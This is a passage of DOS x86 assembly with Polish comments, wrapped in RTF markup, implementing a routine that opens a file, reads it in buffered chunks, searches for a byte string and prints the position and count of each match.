\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; w calym pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,seg ProgDTA                  ; ustaw ES na segment, do ktorego beda}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es,ax                           ; wczytywane dane =127 sektorow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,word ptr [BufDTA.Dlugosc]    ; -DX:AX = dlugosc pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,word ptr [BufDTA.Dlugosc+2]  ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or dx,dx                            ; czy b. znacz. czesc dlugosci =0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz DlugiPlik                       ; nie -> dlugosc<>0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp ax,DlugoscCiagu                 ; b. znacz. czesc=0, czy mniej znacz. czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jae DlugiPlik                       ; dlugosci > dlugosc ciagu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlPlikZaKrotki       ; Blad : plik krotszy od ciagu !}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short NieMogeOtworzyc           ; wyswietl blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugiPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,offset TeSzukamCiagu         ; wyswietl informacje o szukaniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call DrukLn                         ; lancuchu w pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlNieMogeOtworzyc    ; ewentualny numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,Offset NazwaPliku            ; nazwa pliku w DS:DX, tryb dostepu w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,3D00h+TrybOtwarciaPliku      ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; DOS : otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc NieMogeOtworzyc                  ; CF=1 -> blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xchg ax,bx                          ; BX=uchwyt pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call CzytajSzukaj                   ; szukaj lancucha w calym pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc NieMogeOtworzyc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,3Eh                          ; zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,word ptr [IleZnalezionych]   ; wyswietl, ile razy ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,word ptr [IleZnalezionych+2] ; wystapil w pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si, offset TeZnalazlem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or dx,dx                            ; \\  sprawdz, czy przynajmniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz CosZnalazl                      ;  \\ raz, jak ani razu to}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or ax,ax                            ;  / inny komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz CosZnalazl                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si, offset TeNieZnalazlem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CosZnalazl:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call DrukLn                         ; wyswietl komunikat spod DS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 clc                                 ; nie ma bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMogeOtworzyc:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajLancuch   endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytajSzukaj    proc near                           ; czytaj w pliku i szukaj lancuch}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; na wejsciu numer pliku w BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor ax,ax                           ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [IleZnalezionych]  ,ax ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [IleZnalezionych+2],ax ;   - wyzeruj zmienne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [AdresCzytania],ax     ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [AdresCzytania+2],ax   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov NumerBledu,BlNieMogeCzytac      ; ewent. blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor bp,bp                           ; BP oznacza odstep od poczatku bufora,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; pod ktory wczytujemy dane, na poczatku=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec DlugoscCiagu                    ; zmniejsz o 1 dlugosc ciagu potrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; w pozniejszej operacji porownania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cld                                 ; w oper. lancuchowych INC(SI,DI)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytajDoBufora:                                     ; petla glowna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ds                             ; zachowaj DS na stosie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,es}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ds,ax                           ; DS=ES=segment na dane z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cx,RozmiarBuforaDanych          ; ile czytac danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,offset BuforDanych           ; DS:DX = tu wczytuj dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add dx,bp                           ; dodaj dlug. danych, ktore zostaly z poprz. odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,3Fh                          ; DOS : funkcja czytania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h                             ; DOS : wykonaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds                              ; przywroc DS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc NieMogeCzytac                    ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add word ptr [AdresCzytania],ax     ; \\dodaj do pozycji odczytu ilosc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 adc word ptr [AdresCzytania+2],0    ; /odczytanaych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov [Przeczytane],ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add ax,bp                           ; \\do ilosci odczytanych bajtow dodaj dlugosc danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; /pozostalych z poprzedniego odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp ax,DlugoscCiagu                 ; \\  ax=dlugosc danych do porownania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jb KoniecPliku                      ;  - jesli mniej niz ciag, to nie trzeba porownywac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; /  bo i tak ciag sie nie znajdzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xchg ax,cx                          ; cx=dlugosc danych do porownania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push cx                             ; zachowaj do pozniejszego porownania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov di,offset BuforDanych           ; poczatek danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajPierwszej:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,Offset Ciag                  ; ofset do wyszukiwanego ciagu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lodsb                               ; al=pierwsza litera ciagu, INC(SI)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 repnz scasb                         ; szukaj, az znajdzie w danych pierwsza litere}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jnz NieMaPierwszej                  ; jesli nie znalazl, to czytaj dalej z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp cx,DlugoscCiagu                 ; czy wystarczy danych w buforze do porownania ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jae PorownajCaly                    ; jest co najmniej tyle lub wiecej to OK}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 inc cx                              ; - za malo danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec di                              ; - cofnij DI,CX na poprzednie wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,di                           ; - skopiuj koncowke bufora na poczatek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov di,offset BuforDanych           ; - zachowaj w BP dlugosc tej koncowki}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bp,cx                           ; - w nastepnym odczycie dane wczytane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 rep movs byte ptr es:[di],es:[si]   ; - umieszczone beda za ta koncowka}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short NieMaPierwszej            ; - a porownywanie sie powtorzy, ale teraz beda dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PorownajCaly:                                       ; - do porownania, po skoku czytaj dalej dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push cx                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push di                             ; zachowaj aktualna pozycje w buforze i licznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cx,DlugoscCiagu                 ; dokladniej : dlugosc ciagu-1 bo nie musimy porownywac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; pierwszej litery, ktora juz byla sprawdzona}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jcxz JednoLiterowy                  ; jesli CX=0, to ciag byl jednoliterowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 rep cmpsb                           ; porownaj cx bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jne NieMaLancucha                   ; jesli ZF=0, nie znalazl ciagu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JednoLiterowy:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,word ptr [AdresCzytania]     ; DX:AX=32 bitowa pozycja odczytu pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,word ptr [AdresCzytania+2]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sub ax,[Przeczytane]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sbb dx,0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sub ax,bp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sbb dx,0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop di                              ; przywroc odleglosc od poczatku bufora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push di                             ; zachowaj di}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec di                              ; zmniejsz wskaznik, zeby wskazywal na pierwsza litere}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add ax,di}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 adc dx,0                            ; dodawanie 32 bitowe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; DX:AX = adres fizyczny wzgledem pocz. pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [AdresZnalezienia],ax  ; -zapamietaj ten adres w zmiennej, bo procedura}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [AdresZnalezienia+2],dx; /konwersji korzysta z ofsetu do zmiennej, zeby ja wyswietlic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,offset TeZnalezionyNaPozycji ; -wyswietl tekst ze znalazl}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call DrukLn                         ; /adres : wyswietl szesnastkowo i dziesiatkowo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add word ptr [IleZnalezionych],1    ; -zwieksz 32 bitowy licznik wystapien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 adc word ptr [IleZnalezionych+2],0  ; /dodaj ewentualne przeniesienie z 15 na 16 bit}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaLancucha:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop di                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop cx                              ; przywroc aktualna pozycje w buforze+licznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jcxz NieMaPierwszej                 ; czy juz caly bufor pusty ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                ; xor bp,bp                          ; zeruj dlugosc koncowki}{\f2\fs24\lang1045{\*\listtag0}\par}
